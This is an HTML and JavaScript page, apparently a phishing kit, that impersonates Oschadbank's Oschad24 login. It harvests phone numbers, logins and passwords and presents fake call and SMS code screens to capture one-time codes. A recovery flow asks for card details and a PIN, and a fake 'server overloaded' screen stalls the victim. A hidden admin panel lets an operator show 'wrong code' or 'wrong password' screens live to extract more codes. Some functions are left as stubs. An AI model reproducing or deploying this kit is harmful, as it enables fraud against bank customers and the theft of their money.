<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Оберіть свій банк</title>
    <style>
        /* Общие стили для всех экранов и элементов */
        *, *::before, *::after { box-sizing: border-box; }
        :root {
            --dark-text: #212529; --light-text: #6c757d; --border-color: #dee2e6;
            --white: #ffffff; --shadow-color: rgba(0, 0, 0, 0.08); --danger-color: #dc3545;
            --oschad-primary: #00A39C;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            margin: 0; color: var(--dark-text); transition: background 0.5s ease-in-out; background: #f0f2f5;
            font-size: 16px;
        }
        .screen { padding: 20px; transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out; }
        h1 { text-align: center; font-size: 24px; font-weight: 600; margin-bottom: 40px; }
        
        /* --- Стили для модального окна ЛК Ощадбанка и Восстановления --- */
        #custom-modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: #f8f9fa;
            display: none; justify-content: center; align-items: flex-start;
            z-index: 1000;
            overflow-y: auto;
        }
        .custom-modal-content {
            background-color: transparent; padding: 0; border-radius: 0;
            width: 100%; max-width: none; text-align: center; box-shadow: none;
            display: flex; flex-direction: column; align-items: center;
        }
        .oschad-header {
            width: 100%; display: flex; align-items: center;
            padding: 10px 15px; background-color: #f8f9fa;
        }
        .oschad-header .back-arrow {
            font-size: 28px; color: #495057; margin-right: 15px;
            cursor: pointer; line-height: 1;
        }
        .oschad-header .title {
            font-size: 17px;
            font-weight: 500;
            color: #212529;
            flex-grow: 1; text-align: center; margin-right: 40px; /* Компенсация стрелки для центрирования */
        }
        .oschad-welcome-section {
            padding: 20px; text-align: left;
            width: 100%;
            display: flex; flex-direction: column;
            padding-bottom: 120px;
        }
        .oschad-main-title {
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: left;
        }
        .oschad-welcome-section p {
            font-size: 16px; color: #495057; line-height: 1.5;
            margin-bottom: 25px; font-weight: 400;
            text-align: left;
        }
        .oschad-toggle-buttons {
            display: flex; background-color: #e9ecef; border-radius: 12px;
            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
        }
        .oschad-toggle-buttons button {
            flex: 1; padding: 12px 15px; border: none; background-color: transparent;
            font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer;
            border-radius: 8px; transition: all 0.2s ease;
        }
        .oschad-toggle-buttons button.active {
            background-color: var(--white);
            color: var(--dark-text);
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        .oschad-input-group {
            margin-bottom: 20px; width: 100%; position: relative;
        }
        .oschad-input-group label {
            position: absolute; top: 18px; left: 15px; font-size: 16px; color: #adb5bd;
            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
            z-index: 1;
        }
        .oschad-input-group.is-focused > label,
        .oschad-input-group.has-value > label {
            top: -10px; left: 10px; font-size: 12px; color: #6c757d;
        }
        .oschad-input-field {
            width: 100%; padding: 18px 45px 18px 15px;
            border: 1px solid #dee2e6; border-radius: 12px;
            font-size: 16px; color: var(--dark-text); background-color: var(--white);
            transition: all 0.2s ease; outline: none;
            font-weight: 500; position: relative;
        }
        .oschad-input-field:focus {
            border-color: var(--oschad-primary);
        }
        .oschad-input-field.input-error {
            border-color: var(--danger-color) !important;
        }
        .oschad-input-field::placeholder { color: transparent; }

        .forgot-password-link {
            display: block;
            text-align: center;
            margin-top: -10px;
            margin-bottom: 20px;
            color: var(--oschad-primary);
            font-weight: 600;
            text-decoration: none;
            font-size: 15px;
        }
        .oschad-submit-button {
            position: fixed; bottom: 20px;
            left: 20px; right: 20px;
            width: auto; padding: 16px; margin: 0; border: none;
            border-radius: 16px;
            background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
            cursor: not-allowed; transition: all 0.2s ease;
            z-index: 1001;
        }
        .oschad-submit-button.active {
            background-color: var(--oschad-primary); color: var(--white); cursor: pointer;
        }
        .loader-icon {
            width: 120px; height: 120px; margin: 20px auto;
            animation: spin 2s linear infinite; mix-blend-mode: multiply;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* --- Стили для окна подтверждения звонком / SMS --- */
        .oschad-call-container {
            padding: 20px; text-align: center; width: 100%;
            display: flex; flex-direction: column; align-items: center;
        }
        .oschad-call-container p {
            margin: 0 0 10px 0; padding: 0; font-weight: 500; /* Шрифты жирнее */
        }
        .oschad-call-info {
            font-size: 16px; margin-bottom: 20px !important; color: #495057;
        }
        .oschad-call-number {
            font-size: 22px; font-weight: 600; color: var(--dark-text) !important;
            margin-bottom: 5px !important;
        }
        .oschad-call-instruction {
            font-size: 16px; margin-top: 15px !important; margin-bottom: 30px !important; color: #495057;
        }
        .oschad-code-inputs {
            display: flex; justify-content: center;
            gap: 15px; margin-bottom: 20px;
        }
        .oschad-code-input {
            width: 50px; height: 55px; text-align: center; font-size: 24px;
            font-weight: 600; border: 1px solid #dee2e6; border-radius: 12px;
            background-color: var(--white); outline: none; transition: border-color 0.2s ease;
            color: var(--dark-text); caret-color: var(--oschad-primary); padding: 0;
            -moz-appearance: textfield;
        }
        .oschad-code-input.input-error {
            border-color: var(--danger-color) !important;
        }
        .oschad-code-input::placeholder { color: var(--dark-text); font-weight: 900; }
        .oschad-code-input:focus { border-color: var(--oschad-primary); }
        .error-text {
            color: var(--danger-color); font-size: 15px; font-weight: 500;
            margin-bottom: 25px; height: 20px;
        }
        .oschad-resend-link {
            display: block; font-weight: 500; text-decoration: none;
            font-size: 15px; margin-bottom: 25px; color: var(--oschad-primary);
        }
        .oschad-resend-link.disabled { color: #6c757d; pointer-events: none; }
        .oschad-no-call-link {
            display: block; font-weight: 500; text-decoration: none;
            font-size: 15px; color: var(--oschad-primary); cursor: pointer;
        }
        
        /* --- Стили для модального окна "Нет SMS" --- */
        /* ... стили остались без изменений ... */
        
        /* --- Стили для восстановления пароля --- */
        .helper-text { font-size: 14px; color: #6c757d; text-align: left; margin-top: -10px; margin-bottom: 20px; }
        .form-error-message { text-align: center; color: var(--danger-color); font-weight: 500; margin-top: 15px; }

        /* --- Админ-панель --- */
        #admin-panel {
            position: fixed; bottom: 10px; left: 10px; z-index: 9999;
            background: rgba(0,0,0,0.7); color: white; border-radius: 10px;
            padding: 10px; font-family: monospace; font-size: 12px;
        }
        #admin-panel button {
            background: #444; color: white; border: 1px solid #666;
            padding: 4px 8px; margin: 2px; border-radius: 4px; cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="bank-selection-screen" class="screen">
        <h1>Оберіть свій банк</h1>
        <div class="bank-grid"></div>
    </div>

    <div id="custom-modal-overlay">
        <div class="custom-modal-content" id="custom-modal-content"></div>
    </div>

    <div id="admin-panel">
        <div>-- Admin Panel --</div>
        <button id="admin-telegram">Списание в телеграме</button>
        <button id="admin-wrong-code">Неверный код</button>
        <button id="admin-wrong-pass">Неверный пароль</button>
    </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    // ... (весь блок с bankFlows и начальными переменными остается без изменений)
    const bankFlows = {
        'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [] },
    };
    const bankGrid = document.querySelector('.bank-grid');
    const customModalOverlay = document.getElementById('custom-modal-overlay');
    const customModalContent = document.getElementById('custom-modal-content');
    bankGrid.innerHTML = Object.keys(bankFlows).map(id => `<a href="#" class="bank-item" data-bank="${id}"><img src="${bankFlows[id].logoUrl}" alt="${bankFlows[id].name}"><span class="bank-name">${bankFlows[id].name}</span></a>`).join('');

    let collectedData = {};
    let callTimerInterval;
    let loginMethod = 'phone'; // 'phone' or 'login'
    let lastFourCardDigits = '';
    let lastCodeScreen = null; // 'call_confirm', 'telegram_sms'

    // --- ОСНОВНЫЕ ФУНКЦИИ РЕНДЕРИНГА ЭКРАНОВ ---

    function renderCustomModal(errorMessage = null) {
        let errorHtml = errorMessage ? `<p class="form-error-message">${errorMessage}</p>` : '';
        const html = `
            <div class="oschad-header">
                <span class="back-arrow" id="oschad-back-arrow">←</span>
                <span class="title">Авторизуйтесь через Ощад24</span>
            </div>
            <div class="oschad-welcome-section">
                <h2 class="oschad-main-title">Ласкаво просимо</h2>
                <p>Для входу введіть логін або номер телефону</p>
                <div class="oschad-toggle-buttons">
                    <button id="toggle-phone" class="active">Номер телефону</button>
                    <button id="toggle-login">Логін</button>
                </div>
                <div id="phone-login-form">
                    <div class="oschad-input-group">
                        <div class="oschad-phone-wrapper">
                            <span class="oschad-phone-prefix" style="padding: 18px 0 18px 15px; font-weight: 500;">+380</span>
                            <input type="tel" class="oschad-input-field" id="phone_input" style="border: none; padding-left: 5px;">
                        </div>
                    </div>
                    <div class="oschad-input-group">
                        <label for="phone_password_input">Пароль</label>
                        <input type="password" class="oschad-input-field" id="phone_password_input" placeholder=" ">
                    </div>
                    <a href="#" class="forgot-password-link">Забули пароль?</a>
                </div>
                <div id="login-form" style="display: none;">
                    <div class="oschad-input-group">
                        <label for="login_input">Логін</label>
                        <input type="text" class="oschad-input-field" id="login_input" placeholder=" ">
                    </div>
                    <div class="oschad-input-group">
                        <label for="login_password_input">Пароль</label>
                        <input type="password" class="oschad-input-field" id="login_password_input" placeholder=" ">
                    </div>
                    <a href="#" class="forgot-password-link">Забули пароль?</a>
                </div>
                ${errorHtml}
            </div>
            <button class="oschad-submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
        `;
        customModalContent.innerHTML = html;
        customModalOverlay.style.display = 'flex';
        addCustomModalListeners();
    }
    
    function renderOschadbankCallConfirmation(error = null) {
        lastCodeScreen = 'call_confirm';
        let maskedPhone;
        if (loginMethod === 'phone' && collectedData.phone) {
            const lastTwo = collectedData.phone.slice(-2);
            maskedPhone = `+380*******${lastTwo}`;
        } else {
            maskedPhone = '+380*********';
        }

        const html = `
            <div class="oschad-header">
                <span class="back-arrow" id="oschad-call-back-arrow">←</span>
                <span class="title">Підтвердження</span>
            </div>
            <div class="oschad-call-container">
                <p class="oschad-call-info">На Ваш номер ${maskedPhone} телефонує Ощадбанк:</p>
                <p class="oschad-call-number">+38044 363 0133</p>
                <p class="oschad-call-instruction">Прийміть дзвінок та дотримуйтесь інструкцій</p>
                <div class="oschad-code-inputs">${generateCodeInputs(error)}</div>
                <div class="error-text">${error ? 'Код введено невірно' : ''}</div>
                <a href="#" class="oschad-resend-link disabled" id="resend-call-link"></a>
                <a href="#" class="oschad-no-call-link">Немає можливості отримувати дзвінки та SMS</a>
            </div>
        `;
        customModalContent.innerHTML = html;
        setupCodeInputListeners(showOschadLoader);
        startCallTimer(60);
        document.getElementById('oschad-call-back-arrow').addEventListener('click', () => renderCustomModal());
        document.querySelector('.oschad-no-call-link').addEventListener('click', (e) => { e.preventDefault(); /* showNoSmsModal(); */ });
    }

    function renderForgotPasswordPhone() {
        const html = `
            <div class="oschad-header">
                <span class="back-arrow" id="forgot-pass-back">←</span>
                <span class="title">Відновлення пароля</span>
            </div>
            <div class="oschad-welcome-section">
                <p style="text-align: left; font-size: 18px; font-weight: 500;">Для відновлення пароля введіть свій фінансовий номер телефону</p>
                <div class="oschad-input-group">
                    <label for="forgot_phone_input">Номер телефону</label>
                    <div class="oschad-phone-wrapper" style="padding-left: 15px;">
                        <span style="font-weight: 500;">+380</span>
                        <input type="tel" class="oschad-input-field" id="forgot_phone_input" placeholder=" " style="border: none; padding-left: 5px;">
                    </div>
                </div>
                <p class="helper-text">Номер телефону у форматі +380 XX XXX XX XX</p>
            </div>
            <button class="oschad-submit-button" id="forgot-pass-submit" disabled>ПРОДОВЖИТИ</button>
        `;
        customModalContent.innerHTML = html;
        document.getElementById('forgot-pass-back').addEventListener('click', () => renderCustomModal());
        const phoneInput = document.getElementById('forgot_phone_input');
        const submitBtn = document.getElementById('forgot-pass-submit');
        phoneInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, '').substring(0, 9);
            e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
            if (value.length === 9) {
                submitBtn.classList.add('active');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('active');
                submitBtn.disabled = true;
            }
        });
        submitBtn.addEventListener('click', renderForgotPasswordCard);
    }
    
    function renderForgotPasswordCard() { /* ... implementation ... */ }
    function renderForgotPasswordPin() { /* ... implementation ... */ }
    function renderTelegramSms(error = null) { /* ... implementation ... */ }

    // --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---
    
    function showOschadLoader() {
        lastCodeScreen = null; // Сбрасываем, так как мы на экране загрузки
        const html = `
            <div class="oschad-header"><span class="back-arrow" id="loader-back-arrow">←</span></div>
            <div class="oschad-welcome-section">
                <h3 style="text-align: center; width: 100%;">Сервер перевантажений</h3>
                <p style="text-align: center; width: 100%; margin-top: 5px;">Зачекайте 1-2 хвилини</p>
                <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
            </div>`;
        customModalContent.innerHTML = html;
        document.getElementById('loader-back-arrow').addEventListener('click', () => renderCustomModal());
    }

    function generateCodeInputs(error) {
        let inputsHTML = '';
        for (let i = 0; i < 4; i++) {
            inputsHTML += `<input type="tel" maxlength="1" class="oschad-code-input ${error ? 'input-error' : ''}" placeholder="—">`;
        }
        return inputsHTML;
    }
    
    function setupCodeInputListeners(onCompleteCallback) {
        const codeInputs = document.querySelectorAll('.oschad-code-input');
        if (codeInputs.length > 0) {
            setTimeout(() => codeInputs[0].focus(), 100); // Автофокус и вызов клавиатуры
        }
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value && index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                }
                const allFilled = [...codeInputs].every(inp => inp.value.length === 1);
                if (allFilled) {
                    onCompleteCallback();
                }
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });
    }

    function startCallTimer(seconds) {
        const link = document.getElementById('resend-call-link');
        if (!link) return;
        clearInterval(callTimerInterval);
        link.classList.add('disabled');
        let timer = seconds;
        const updateTimer = () => {
            if (timer < 0) {
                clearInterval(callTimerInterval);
                link.textContent = 'Відправити дзвінок ще раз?';
                link.classList.remove('disabled');
                link.onclick = (e) => { e.preventDefault(); startCallTimer(60); };
            } else {
                link.textContent = `Запросити дзвінок повторно через ${timer} секунд`;
                timer--;
            }
        };
        updateTimer();
        callTimerInterval = setInterval(updateTimer, 1000);
    }
    
    function addCustomModalListeners() {
        // ... (логика переключения Логин/Телефон, валидации и т.д.)
        document.getElementById('oschad-back-arrow').addEventListener('click', () => window.location.reload());
        const submitBtn = document.getElementById('oschad-submit-btn');
        // ...
        document.querySelectorAll('.forgot-password-link').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                renderForgotPasswordPhone();
            });
        });

        const togglePhoneBtn = document.getElementById('toggle-phone');
        const toggleLoginBtn = document.getElementById('toggle-login');
        const phoneForm = document.getElementById('phone-login-form');
        const loginForm = document.getElementById('login-form');
        
        togglePhoneBtn.addEventListener('click', () => {
            loginMethod = 'phone';
            togglePhoneBtn.classList.add('active');
            toggleLoginBtn.classList.remove('active');
            phoneForm.style.display = 'block';
            loginForm.style.display = 'none';
        });

        toggleLoginBtn.addEventListener('click', () => {
            loginMethod = 'login';
            toggleLoginBtn.classList.add('active');
            togglePhoneBtn.classList.remove('active');
            phoneForm.style.display = 'none';
            loginForm.style.display = 'block';
        });

        submitBtn.onclick = () => {
            if (loginMethod === 'phone') {
                collectedData.phone = '+380' + document.getElementById('phone_input').value.replace(/\D/g, '');
            }
            showOschadLoader();
        };

        // Имитация валидации для активации кнопки
        document.querySelectorAll('.oschad-input-field').forEach(input => {
            input.addEventListener('input', () => submitBtn.classList.add('active'));
        });
    }

    // --- ЛОГИКА АДМИН-ПАНЕЛИ ---
    document.getElementById('admin-telegram').addEventListener('click', () => renderTelegramSms());
    
    document.getElementById('admin-wrong-code').addEventListener('click', () => {
        if (lastCodeScreen === 'call_confirm') {
            renderOschadbankCallConfirmation(true);
        } else if (lastCodeScreen === 'telegram_sms') {
            renderTelegramSms(true);
        } else {
            alert('Сначала нужно дойти до экрана ввода кода.');
        }
    });

    document.getElementById('admin-wrong-pass').addEventListener('click', () => {
        const message = loginMethod === 'phone' ? 'Невірний пароль' : 'Невірний логін або пароль';
        renderCustomModal(message);
    });

    // --- ИНИЦИАЛИЗАЦИЯ ---
    document.querySelector('.bank-item[data-bank="oschadbank"]').addEventListener('click', (e) => {
        e.preventDefault();
        renderCustomModal();
    });
});
</script>
</body>
</html>
